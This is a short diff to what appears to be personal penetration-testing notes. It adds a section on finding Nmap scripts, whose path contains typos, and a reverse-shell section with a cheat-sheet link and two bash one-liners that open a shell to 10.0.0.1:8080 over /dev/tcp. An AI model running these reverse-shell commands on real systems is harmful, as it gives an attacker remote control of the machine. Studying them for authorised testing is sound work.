@@ -58,3 +58,18 @@ Any user can read the file keeping system-wide cron jobs under /etc/crontab
 
 #### Windows Privilege Escalation
 
+
+
+
+### Searching scripts to use with NMAP
+
+ls -al /user/share/nmap/sripts/ | grep -e "nmap"\
+Here is an example of what you can expect to see:
+- ![Results!](screenshots/1.png)
+
+
+### Reverse shell tips/information
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
